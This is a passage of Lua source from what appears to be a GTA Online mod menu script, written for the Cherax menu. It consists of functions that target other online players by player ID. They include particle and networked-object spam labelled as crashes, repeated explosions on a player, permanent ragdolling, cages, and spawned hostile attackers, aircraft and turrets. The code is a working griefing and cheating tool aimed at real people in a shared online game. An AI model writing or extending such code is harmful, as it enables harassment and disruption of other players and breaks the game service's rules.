                        requestControlOfEntity(ped)
                        -- Set ragdoll with extreme values
                        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, ped, 10000, 10000, 0, false, false, false)
                        -- Apply random force
                        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, ped, 1,
                            (math.random() - 0.5) * 50,
                            (math.random() - 0.5) * 50,
                            math.random() * 30,
                            true, false, true, true)
                    end
                end)
            end
            Script.Yield(100)
        end
        
        Script.Yield(2000)
        
        -- Clean up
        for _, ped in ipairs(peds) do
            pcall(function()
                betterDelete(ped, true)
            end)
        end
        
        NoLongerNeeded(mdl)
        toast(SCRIPT_NAME, "Ragdoll Spam sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- PARTICLE CRASH - Spam particle effects at target (can cause render issues)
-- ═══════════════════════════════════════════════════════════════════════════

local function ParticleCrash(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Particle Crash executing...")
        
        -- Request particle assets
        local assets = {"core", "scr_rcbarry2", "scr_indep_fireworks", "scr_xmas_fireworks"}
        for _, asset in ipairs(assets) do
            Natives.InvokeVoid(N.REQUEST_NAMED_PTFX_ASSET, asset)
        end
        Script.Yield(500)
        
        -- Spam many particles
        for i = 1, 100 do
            pcall(function()
                local angle = (i / 20) * 6.28
                local radius = 2 + (i % 10)
                local effectX = px + math.cos(angle) * radius
                local effectY = py + math.sin(angle) * radius
                local effectZ = pz + (i % 5)
                
                if i % 4 == 0 then
                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "core")
                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD, 
                        "exp_grd_bzgas_smoke", effectX, effectY, effectZ, 
                        0, 0, 0, 5.0, false, false, false)
                elseif i % 4 == 1 then
                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_rcbarry2")
                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
                        "scr_clown_appears", effectX, effectY, effectZ,
                        0, 0, 0, 3.0, false, false, false)
                elseif i % 4 == 2 then
                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_indep_fireworks")
                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
                        "scr_indep_firework_starburst", effectX, effectY, effectZ,
                        0, 0, 0, 2.0, false, false, false)
                else
                    Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, "scr_xmas_fireworks")
                    Natives.InvokeVoid(N.START_PARTICLE_FX_NON_LOOPED_AT_COORD,
                        "scr_firework_xmas_spiral_burst_rgw", effectX, effectY, effectZ,
                        0, 0, 0, 2.0, false, false, false)
                end
            end)
            Script.Yield(10)
        end
        
        toast(SCRIPT_NAME, "Particle Crash sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CAGE + EXPLOSION COMBO - Cage then explode repeatedly
-- ═══════════════════════════════════════════════════════════════════════════

local function CageExplosion(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Cage Explosion executing...")
        
        -- First spawn cage
        local cageModel = Utils.Joaat("prop_container_ld2")
        if requestModel(cageModel) then
            local cage = GTA.CreateObject(cageModel, px, py, pz - 1, true, true)
            if cage then
                table.insert(State.spawnedEntities, cage)
            end
        end
        NoLongerNeeded(cageModel)
        
        Script.Yield(500)
        
        -- Then spam explosions inside
        for i = 1, 15 do
            Natives.InvokeVoid(N.ADD_EXPLOSION, px, py, pz, 7, 5.0, true, false, 0.5)
            Script.Yield(150)
        end
        
        toast(SCRIPT_NAME, "Cage Explosion complete!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- NET OBJECT SPAM - Spawn many networked objects rapidly
-- ═══════════════════════════════════════════════════════════════════════════

local function NetObjectSpam(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    local spamModels = {
        Utils.Joaat("prop_drug_package"),
        Utils.Joaat("prop_money_bag_01"),
        Utils.Joaat("prop_cs_box_clothes"),
    }
    
    local objects = {}
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "Net Object Spam executing...")
        
        for _, mdl in ipairs(spamModels) do
            requestModel(mdl)
        end
        Script.Yield(100)
        
        -- Spam 50 networked objects
        for i = 1, 50 do
            local mdl = spamModels[(i % #spamModels) + 1]
            pcall(function()
                local obj = GTA.CreateObject(mdl, 
                    px + (math.random() - 0.5) * 10, 
                    py + (math.random() - 0.5) * 10, 
                    pz + math.random() * 5, 
                    true, true)  -- networked = true
                if obj and obj ~= 0 then
                    table.insert(objects, obj)
                    table.insert(State.spawnedEntities, obj)
                end
            end)
            Script.Yield(15)
        end
        
        for _, mdl in ipairs(spamModels) do
            NoLongerNeeded(mdl)
        end
        
        Script.Yield(3000)
        
        -- Clean up
        for _, obj in ipairs(objects) do
            pcall(function()
                betterDelete(obj, true)
            end)
        end
        
        toast(SCRIPT_NAME, "Net Object Spam sent! (50 objects)")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- BLACK HOLE - Pulls ALL entities toward target continuously  
-- ═══════════════════════════════════════════════════════════════════════════

local BlackHoleTargets = {}

local function blackHoleTick(pid)
    local centerX, centerY, centerZ = getPlayerCoords(pid)
    if not centerX then return end
    
    local pullStrength = 25
    local maxRange = 200
    local maxRangeSq = maxRange * maxRange
    
    -- Pull vehicles
    local vehicles = PoolMgr.GetRenderedVehicles()
    if vehicles then
        local count = 0
        for _, vehObj in pairs(vehicles) do
            if count > 10 then break end
            pcall(function()
                local handle = GTA.PointerToHandle(vehObj)
                if handle and handle ~= 0 then
                    local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                    if vx then
                        local dx = centerX - vx
                        local dy = centerY - vy
                        local dz = centerZ - vz
                        local distSq = dx*dx + dy*dy + dz*dz
                        
                        if distSq < maxRangeSq and distSq > 25 then
                            requestControlOfEntity(handle)
                            local dist = math.sqrt(distSq)
                            local force = pullStrength * (1 - (dist / maxRange))
                            
                            Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                (dx / dist) * force,
                                (dy / dist) * force,
                                (dz / dist) * force + 5,
                                true, false, true, true)
                            count = count + 1
                        end
                    end
                end
            end)
        end
    end
    
    -- Pull peds
    local peds = PoolMgr.GetRenderedPeds()
    if peds then
        local count = 0
        for _, pedObj in pairs(peds) do
            if count > 8 then break end
            pcall(function()
                local handle = GTA.PointerToHandle(pedObj)
                if handle and handle ~= 0 then
                    -- Skip player peds
                    if not Natives.InvokeBool(N.IS_PED_A_PLAYER, handle) then
                        local px, py, pz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                        if px then
                            local dx = centerX - px
                            local dy = centerY - py
                            local dz = centerZ - pz
                            local distSq = dx*dx + dy*dy + dz*dz
                            
                            if distSq < maxRangeSq and distSq > 16 then
                                requestControlOfEntity(handle)
                                local dist = math.sqrt(distSq)
                                local force = pullStrength * 0.5
                                
                                -- Ragdoll and pull
                                Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, handle, 1000, 1000, 0, false, false, false)
                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                    (dx / dist) * force,
                                    (dy / dist) * force,
                                    (dz / dist) * force + 3,
                                    true, false, true, true)
                                count = count + 1
                            end
                        end
                    end
                end
            end)
        end
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- PED LAUNCHER - Launches traffic peds at target like missiles
-- ═══════════════════════════════════════════════════════════════════════════

local PedLauncherTargets = {}

local function pedLauncherTick(pid)
    local targetX, targetY, targetZ = getPlayerCoords(pid)
    if not targetX then return end
    
    local launchPower = 150
    
    local peds = PoolMgr.GetRenderedPeds()
    if not peds then return end
    
    local launched = 0
    for _, pedObj in pairs(peds) do
        if launched >= 3 then break end  -- Max 3 per tick
        
        pcall(function()
            local handle = GTA.PointerToHandle(pedObj)
            if handle and handle ~= 0 and not Natives.InvokeBool(N.IS_PED_A_PLAYER, handle) then
                local px, py, pz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                if px then
                    local dx = targetX - px
                    local dy = targetY - py
                    local dz = targetZ - pz
                    local dist = math.sqrt(dx*dx + dy*dy + dz*dz)
                    
                    -- Only launch peds 20-100m away
                    if dist > 20 and dist < 100 then
                        requestControlOfEntity(handle)
                        
                        -- Set ragdoll
                        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, handle, 5000, 5000, 0, false, false, false)
                        
                        -- Launch toward target
                        Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                            (dx / dist) * launchPower,
                            (dy / dist) * launchPower,
                            30,  -- Arc upward
                            true, false, true, true)
                        
                        launched = launched + 1
                    end
                end
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- GLITCH BOMB - Multiple effects at once for maximum chaos
-- ═══════════════════════════════════════════════════════════════════════════

local function GlitchBomb(pid)
    local px, py, pz = getPlayerCoords(pid)
    if not px then return end
    
    Script.QueueJob(function()
        toast(SCRIPT_NAME, "GLITCH BOMB DEPLOYED!")
        
        -- Wave 1: Explosions
        for i = 1, 5 do
            local angle = (i / 5) * 6.28
            Natives.InvokeVoid(N.ADD_EXPLOSION, 
                px + math.cos(angle) * 5, 
                py + math.sin(angle) * 5, 
                pz, 82, 1.0, true, false, 1.0)
        end
        Script.Yield(100)
        
        -- Wave 2: Fire ring
        for i = 1, 8 do
            local angle = (i / 8) * 6.28
            Natives.InvokeVoid(N.ADD_EXPLOSION,
                px + math.cos(angle) * 10,
                py + math.sin(angle) * 10,
                pz, 3, 1.0, true, false, 0.5)
        end
        Script.Yield(100)
        
        -- Wave 3: Launch nearby vehicles
        local vehicles = PoolMgr.GetRenderedVehicles()
        if vehicles then
            local count = 0
            for _, vehObj in pairs(vehicles) do
                if count > 5 then break end
                pcall(function()
                    local handle = GTA.PointerToHandle(vehObj)
                    if handle and handle ~= 0 then
                        local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
                        if vx then
                            local dist = math.sqrt((px-vx)^2 + (py-vy)^2)
                            if dist < 50 then
                                requestControlOfEntity(handle)
                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
                                    (math.random() - 0.5) * 100,
                                    (math.random() - 0.5) * 100,
                                    math.random() * 100 + 50,
                                    true, false, true, true)
                                count = count + 1
                            end
                        end
                    end
                end)
            end
        end
        
        -- Wave 4: Big explosion
        Script.Yield(200)
        Natives.InvokeVoid(N.ADD_EXPLOSION, px, py, pz, 8, 100.0, true, false, 2.0)
        
        toast(SCRIPT_NAME, "GLITCH BOMB COMPLETE!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- RAGDOLL LOOP - Keeps target in permanent ragdoll
-- ═══════════════════════════════════════════════════════════════════════════

local RagdollTargets = {}

local function ragdollTick(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    pcall(function()
        Natives.InvokeVoid(N.SET_PED_TO_RAGDOLL, targetPed, 1000, 1000, 0, false, false, false)
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- EXPLOSION FUNCTIONS - FIXED: Uses PED handle not player ID!
-- ═══════════════════════════════════════════════════════════════════════════

local function explosion(x, y, z, expType, damage, shake)
    local eType = expType or ExplosionSettings.effectType
    local eDamage = damage or 100.0
    local eShake = shake or ExplosionSettings.camShake
    local audible = ExplosionSettings.audible
    local invisible = ExplosionSettings.invisible
    
    if ExplosionSettings.owned then
        -- FIXED: ADD_OWNED_EXPLOSION uses PED handle as first argument, not player ID!
        local myPed = getLocalPlayerPed()
        Natives.InvokeVoid(N.ADD_OWNED_EXPLOSION, myPed, x, y, z, eType, eDamage, audible, invisible, eShake)
    else
        Natives.InvokeVoid(N.ADD_EXPLOSION, x, y, z, eType, eDamage, audible, invisible, eShake)
    end
end

local function explodePlayer(pid, isLoop, customExpType)
    local x, y, z = getPlayerCoords(pid)
    if not x then return end
    
    local expType = customExpType or PlayerExplosionType[pid] or ExplosionSettings.effectType
    
    if not isLoop then
        Script.QueueJob(function()
            for i = 1, 50 do
                explosion(x, y, z, expType)
                Script.Yield(10)
            end
        end)
    else
        explosion(x, y, z, expType)
    end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- DOLOS ATTACKER SYSTEM
-- ═══════════════════════════════════════════════════════════════════════════

-- Track attacker for a player
local function trackAttacker(pid, entity)
    if not AttackersByPid[pid] then
        AttackersByPid[pid] = {}
    end
    table.insert(AttackersByPid[pid], entity)
    table.insert(State.spawnedEntities, entity)
end

-- Delete all attackers for a player
local function deleteAttackers(pid)
    if AttackersByPid[pid] then
        for _, entity in pairs(AttackersByPid[pid]) do
            pcall(function() deleteEntity(entity) end)
        end
        AttackersByPid[pid] = {}
    end
end

-- Get offset from entity in world coords
local function getOffsetFromEntity(entity, offX, offY, offZ)
    local x, y, z = Natives.InvokeV3(N.GET_ENTITY_COORDS, entity, true)
    local heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, entity)
    local headRad = math.rad(heading)
    
    local cosH = math.cos(headRad)
    local sinH = math.sin(headRad)
    
    local worldX = x + (offX * cosH - offY * sinH)
    local worldY = y + (offX * sinH + offY * cosH)
    local worldZ = z + offZ
    
    return worldX, worldY, worldZ
end

-- Create an attacker ped with combat attributes
local function createAttacker(pedHash, x, y, z, heading, weapon)
    if not requestModel(pedHash) then return nil end
    
    local ped = GTA.CreatePed(pedHash, 28, x, y, z, heading, true, true)
    if not ped or ped == 0 then return nil end
    
    -- Set combat attributes (only using natives that work)
    pcall(function() Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, ped, 5, true) end)   -- Can fight armed peds
    pcall(function() Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, ped, 46, true) end)  -- Can attack clients
    pcall(function() Natives.InvokeVoid(N.SET_PED_ACCURACY, ped, 100) end)
    pcall(function() Natives.InvokeVoid(N.SET_PED_COMBAT_ABILITY, ped, 3) end)            -- Aggressive
    pcall(function() Natives.InvokeVoid(N.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS, ped, true) end)
    pcall(function() Natives.InvokeVoid(N.SET_PED_KEEP_TASK, ped, true) end)
    
    -- Add red blip for attacker
    pcall(function()
        local blip = Natives.InvokeInt(N.ADD_BLIP_FOR_ENTITY, ped)
        if blip and blip ~= 0 then
            Natives.InvokeVoid(N.SET_BLIP_COLOUR, blip, 1)  -- Red
            Natives.InvokeVoid(N.SET_BLIP_SPRITE, blip, 270)  -- Enemy marker
        end
    end)
    
    -- Give weapon if specified (skip REQUEST_WEAPON_ASSET - broken in Cherax)
    if weapon and weapon ~= 0 then
        pcall(function()
            Natives.InvokeVoid(N.GIVE_WEAPON_TO_PED, ped, weapon, 9999, false, true)
        end)
    end
    
    return ped
end

-- Send ground attacker after player
local function sendGroundAttacker(pid, pedHash, weapon)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    -- Spawn behind target
    local sx, sy, sz = getOffsetFromEntity(targetPed, 0, -5.0, 0)
    
    Script.QueueJob(function()
        local attacker = createAttacker(pedHash, sx, sy, sz, 0, weapon)
        if attacker then
            Natives.InvokeVoid(N.TASK_COMBAT_PED, attacker, targetPed, 0, 16)
            trackAttacker(pid, attacker)
            toast(SCRIPT_NAME, "Attacker sent!")
        end
    end)
end

-- Send vehicle attacker after player
local function sendVehicleAttacker(pid, pedHash, vehHash, isAircraft)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    Script.QueueJob(function()
        -- Spawn position
        local sx, sy, sz
        if isAircraft then
            sx = tx + math.random(-100, 100)
            sy = ty + math.random(-100, 100)
            sz = tz + 100 + math.random(50)
        else
            sx, sy, sz = getOffsetFromEntity(targetPed, 0, -20.0, 0)
        end
        
        if not requestModel(pedHash) then return end
        if not requestModel(vehHash) then return end
        
        local heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed) or 0
        local vehicle = GTA.SpawnVehicle(vehHash, sx, sy, sz, heading, true, true)
        if not vehicle or vehicle == 0 then 
            log("Failed to spawn vehicle")
            return 
        end
        
        local attacker = createAttacker(pedHash, sx, sy, sz, heading, 0)
        if not attacker then
            deleteEntity(vehicle)
            return
        end
        
        Natives.InvokeVoid(N.SET_PED_INTO_VEHICLE, attacker, vehicle, -1)
        
        if isAircraft then
            pcall(function() Natives.InvokeVoid(N.SET_HELI_BLADES_FULL_SPEED, vehicle) end)
            pcall(function() Natives.InvokeVoid(N.CONTROL_LANDING_GEAR, vehicle, 3) end)  -- Retract gear
            local maxSpeed = Natives.InvokeFloat(N.GET_VEHICLE_ESTIMATED_MAX_SPEED, vehicle) or 100
            pcall(function() Natives.InvokeVoid(N.SET_VEHICLE_FORWARD_SPEED, vehicle, maxSpeed) end)
            pcall(function() Natives.InvokeVoid(N.TASK_PLANE_MISSION, attacker, vehicle, 0, targetPed, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0) end)
        else
            pcall(function() Natives.InvokeVoid(N.SET_VEHICLE_ENGINE_ON, vehicle, true, true, false) end)
            -- Removed SET_TASK_VEHICLE_CHASE_BEHAVIOR_FLAG - native not found in Cherax
            pcall(function() Natives.InvokeVoid(N.TASK_VEHICLE_CHASE, attacker, targetPed) end)
        end
        
        trackAttacker(pid, attacker)
        trackAttacker(pid, vehicle)
        toast(SCRIPT_NAME, "Vehicle attacker sent!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CLONE PLAYER (for other uses)
-- ═══════════════════════════════════════════════════════════════════════════

local function clonePlayer(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return nil end
    
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return nil end
    
    -- Clone the player's ped
    local clone = nil
    pcall(function()
        clone = Natives.InvokeInt(N.CLONE_PED, targetPed, false, false, true)
    end)
    
    if clone and clone ~= 0 then
        table.insert(State.spawnedEntities, clone)
        return clone
    end
    return nil
end

-- ═══════════════════════════════════════════════════════════════════════════
-- DOLOS MISC TROLLING FUNCTIONS
-- ═══════════════════════════════════════════════════════════════════════════

-- Rain objects on player
local function rainObjects(pid, objHash, count)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    Script.QueueJob(function()
        if not requestModel(objHash) then return end
        
        for i = 1, count do
            local ox = math.random(-10, 10)
            local oy = math.random(-10, 10)
            local sx, sy, sz = getOffsetFromEntity(targetPed, ox, oy, 30.0)
            
            local obj = GTA.CreateObject(objHash, sx, sy, sz, true, true)
            if obj and obj ~= 0 then
                Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, obj, false)
                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, obj, 2, 
                    math.random(-1, 1), 0, -5.0, 0, 0, 0, 0, true, false, false, true, true)
                table.insert(State.spawnedEntities, obj)
            end
            Script.Yield(100)
        end
        toast(SCRIPT_NAME, "Objects rained!")
    end)
end

-- Pillar cage around player - FIXED: Uses actual concrete pillars
local function pillarCage(pid)
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    -- Use tall concrete pillars
    local pillarHash = Utils.Joaat("prop_roadpole_01a")
    
    Script.QueueJob(function()
        if not requestModel(pillarHash) then 
            -- Fallback
            pillarHash = Utils.Joaat("prop_streetlight_01")
            if not requestModel(pillarHash) then return end
        end
        
        local radius = 1.2  -- Tight circle
        local numPillars = 10
        
        for i = 0, numPillars - 1 do
            local angle = (i / numPillars) * 2 * math.pi
            local px = tx + math.cos(angle) * radius
            local py = ty + math.sin(angle) * radius
            
            local pillar = GTA.CreateObject(pillarHash, px, py, tz - 0.5, true, true)
            if pillar and pillar ~= 0 then
                Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, pillar, true)
                table.insert(State.spawnedEntities, pillar)
            end
        end
        
        -- Add ceiling using barriers laid flat
        local ceilHash = Utils.Joaat("prop_barrier_work06a")
        if requestModel(ceilHash) then
            for i = 0, 5 do
                local angle = (i / 6) * 2 * math.pi
                local px = tx + math.cos(angle) * 0.6
                local py = ty + math.sin(angle) * 0.6
                local ceil = GTA.CreateObject(ceilHash, px, py, tz + 2.5, true, true)
                if ceil and ceil ~= 0 then
                    Natives.InvokeVoid(N.SET_ENTITY_ROTATION, ceil, 90, 0, math.deg(angle), 2, true)
                    Natives.InvokeVoid(N.FREEZE_ENTITY_POSITION, ceil, true)
                    table.insert(State.spawnedEntities, ceil)
                end
            end
        end
        
        toast(SCRIPT_NAME, "Pillar cage created!")
    end)
end

-- Chill out (spawn fan)
local function chillOut(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    Script.QueueJob(function()
        local fanHash = Utils.Joaat("xm_prop_tunnel_fan_02")
        if not requestModel(fanHash) then return end
        
        local sx, sy, sz = getOffsetFromEntity(targetPed, 0, 1.5, 1.5)
        local fan = GTA.CreateObject(fanHash, sx, sy, sz, true, true)
        if fan and fan ~= 0 then
            local heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed)
            Natives.InvokeVoid(N.SET_ENTITY_HEADING, fan, heading)
            table.insert(State.spawnedEntities, fan)
        end
        toast(SCRIPT_NAME, "Chill out!")
    end)
end

-- Earthquake effect
local function earthquakeTick(pid)
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    -- Shake explosion (invisible)
    Natives.InvokeVoid(N.ADD_EXPLOSION, tx, ty, tz, 63, 0.0, false, true, 1.0)
    
    -- Occasionally spawn rocks
    if math.random(1, 10) == 3 then
        local rockHashes = {
            Utils.Joaat("rock_4_cl_2_1"),
            Utils.Joaat("prop_ld_rubble_01"),
            Utils.Joaat("prop_ld_rubble_03")
        }
        local rockHash = rockHashes[math.random(#rockHashes)]
        
        Script.QueueJob(function()
            if requestModel(rockHash) then
                local ox = math.random(-10, 10)
                local oy = math.random(-10, 10)
                local rock = GTA.CreateObject(rockHash, tx + ox, ty + oy, tz + 5, true, true)
                if rock and rock ~= 0 then
                    Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, rock, 1, 0, 0, -0.2, 0, 0, 0, 0, true, false, true, true, true)
                    table.insert(State.spawnedEntities, rock)
                end
            end
        end)
    end
end

-- Spawn Naughty Chop with clone of player - clone cowers while Chop attacks
local function spawnNaughtyChop(pid)
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    Script.QueueJob(function()
        -- Chop model
        local chopHash = Utils.Joaat("a_c_chop")
        
        if not requestModel(chopHash) then 
            toast(SCRIPT_NAME, "Failed to load Chop!")
            return 
        end
        
        -- Clone the target player using native CLONE_PED
        local targetPed = getPlayerPed(pid)
        local clone = nil
        
        if targetPed and targetPed ~= 0 then
            pcall(function()
                clone = Natives.InvokeInt(N.CLONE_PED, targetPed, false, false, true)
            end)
        end
        
        if clone and clone ~= 0 then
            table.insert(State.spawnedEntities, clone)
            
            -- Position clone on ground nearby
            local cx = tx + 2
            local cy = ty + 2
            Natives.InvokeVoid(N.SET_ENTITY_COORDS, clone, cx, cy, tz, false, false, false, false)
            
            -- Keep clone alive and cowering
            pcall(function()
                -- Make invincible so it doesn't die
                Natives.InvokeVoid(N.SET_ENTITY_INVINCIBLE, clone, true)
                -- Block events so clone keeps cowering
                Natives.InvokeVoid(N.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS, clone, true)
                Natives.InvokeVoid(N.SET_PED_KEEP_TASK, clone, true)
                -- Make clone cower (hands up scared animation)
                Natives.InvokeVoid(N.TASK_COWER, clone, -1)
            end)
        end
        
        Script.Yield(200)
        
        -- Spawn Chop near the clone
        local sx = tx + math.random(-2, 2)
        local sy = ty - 2.0
        
        local chop = GTA.CreatePed(chopHash, 28, sx, sy, tz, 0, true, true)
        if chop and chop ~= 0 then
            table.insert(State.spawnedEntities, chop)
            
            -- Make Chop aggressive and invincible
            pcall(function()
                Natives.InvokeVoid(N.SET_ENTITY_INVINCIBLE, chop, true)
                Natives.InvokeVoid(N.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS, chop, true)
                Natives.InvokeVoid(N.SET_PED_KEEP_TASK, chop, true)
                Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, chop, 46, true)
                Natives.InvokeVoid(N.SET_PED_COMBAT_ATTRIBUTES, chop, 5, true)
            end)
            
            -- Make Chop attack the clone or the player
            if clone and clone ~= 0 then
                pcall(function()
                    Natives.InvokeVoid(N.TASK_COMBAT_PED, chop, clone, 0, 16)
                end)
            else
                if targetPed and targetPed ~= 0 then
                    pcall(function()
                        Natives.InvokeVoid(N.TASK_COMBAT_PED, chop, targetPed, 0, 16)
                    end)
                end
            end
            
            toast(SCRIPT_NAME, "Naughty Chop spawned!")
        else
            toast(SCRIPT_NAME, "Failed to spawn Chop!")
        end
    end)
end

-- Spawn Anti-Aircraft Turret (from Dolos)
local function spawnAATurret(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    Script.QueueJob(function()
        -- AA turret vehicle (trailer with turret) and gunner
        local vehHash = Utils.Joaat("trailersmall2")
        local pedHash = Utils.Joaat("s_m_y_blackops_01")
        
        if not requestModel(vehHash) then return end
        if not requestModel(pedHash) then return end
        
        -- Spawn behind target
        local sx = tx + math.random(-10, 10)
        local sy = ty - 15
        
        local turret = GTA.SpawnVehicle(vehHash, sx, sy, tz, 0, true, true)
        if not turret or turret == 0 then return end
        
        -- Set the AA weapon mod
        pcall(function()
            Natives.InvokeVoid(N.SET_VEHICLE_MOD, turret, 10, 1, false)
        end)
        
        local gunner = GTA.CreatePed(pedHash, 28, sx, sy, tz, 0, true, true)
        if gunner and gunner ~= 0 then
            Natives.InvokeVoid(N.SET_PED_INTO_VEHICLE, gunner, turret, -1)
            
            -- Set combat attributes
            pcall(function()
                Natives.InvokeVoid(N.SET_PED_ACCURACY, gunner, 100)
                Natives.InvokeVoid(N.SET_PED_COMBAT_ABILITY, gunner, 3)
                Natives.InvokeVoid(N.SET_PED_COMBAT_RANGE, gunner, 3)
                Natives.InvokeVoid(N.TASK_COMBAT_PED, gunner, targetPed, 0, 16)
                Natives.InvokeVoid(N.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS, gunner, true)
            end)
            
            trackAttacker(pid, gunner)
        end
        trackAttacker(pid, turret)
        
        toast(SCRIPT_NAME, "AA Turret spawned!")
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- PTFX SPAM (Named particle effects with selection)
-- ═══════════════════════════════════════════════════════════════════════════

-- Named PTFX Effects table - using effects that are pre-loaded or easy to load
local PtfxEffects = {
    {name = "Clown Appear", asset = "scr_rcbarry1", effect = "scr_clown_appears", scale = 1.0},
    {name = "Fire", asset = "core", effect = "ent_sht_flame", scale = 2.0},
    {name = "Explosion", asset = "core", effect = "exp_grd_grenade_smoke", scale = 1.5},
    {name = "Water", asset = "core", effect = "ent_sht_water", scale = 2.0},
    {name = "Sparks", asset = "core", effect = "ent_brk_sparks", scale = 1.5},
    {name = "Smoke", asset = "core", effect = "exp_grd_bzgas_smoke", scale = 2.0},
    {name = "Blood", asset = "core", effect = "ent_sht_blood", scale = 1.5},
    {name = "Alien", asset = "scr_rcbarry2", effect = "scr_exp_clown", scale = 1.0},
}

local function ptfxSpamTick(pid)
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    -- Get selected effect type (1-8)
    local effectIdx = PtfxSpamType[pid] or 2  -- Default to Fire
    if effectIdx < 1 or effectIdx > #PtfxEffects then effectIdx = 2 end
    
    local fx = PtfxEffects[effectIdx]
    if not fx then return end
    
    -- Random offset around player
    local ox = (math.random() - 0.5) * 6
    local oy = (math.random() - 0.5) * 6
    local oz = math.random() * 2
    
    pcall(function()
        -- Request the asset
        Natives.InvokeVoid(N.REQUEST_NAMED_PTFX_ASSET, fx.asset)
        
        -- Small wait for loading
        local timeout = 0
        while not Natives.InvokeBool(N.HAS_NAMED_PTFX_ASSET_LOADED, fx.asset) and timeout < 10 do
            Script.Yield(0)
            timeout = timeout + 1
        end
        
        -- Set asset for next call
        Natives.InvokeVoid(N.USE_PARTICLE_FX_ASSET, fx.asset)
        
        -- Spawn the particle effect
        Natives.InvokeInt(N.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD,
            fx.effect, 
            tx + ox, ty + oy, tz + oz,
            0.0, 0.0, 0.0,  -- Rotation
            fx.scale or 1.0,  -- Scale
            false, false, false, false)
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CLONE PLAYER (Spawn ped that looks like target player)
-- ═══════════════════════════════════════════════════════════════════════════

local function spawnPlayerClone(pid)
    local targetPed = getPlayerPed(pid)
    if not targetPed or targetPed == 0 then return end
    
    local tx, ty, tz = getPlayerCoords(pid)
    if not tx then return end
    
    Script.QueueJob(function()
        -- Get target's model
        local modelHash = Natives.InvokeInt(N.GET_ENTITY_MODEL, targetPed)
        if not modelHash or modelHash == 0 then
            -- Fallback to mp_m_freemode_01
            modelHash = Utils.Joaat("mp_m_freemode_01")
        end
        
        if not requestModel(modelHash) then
            toast(SCRIPT_NAME, "Failed to load player model!")
            return
        end
        
        -- Spawn clone near player
        local sx = tx + math.random(-3, 3)
        local sy = ty + math.random(-3, 3)
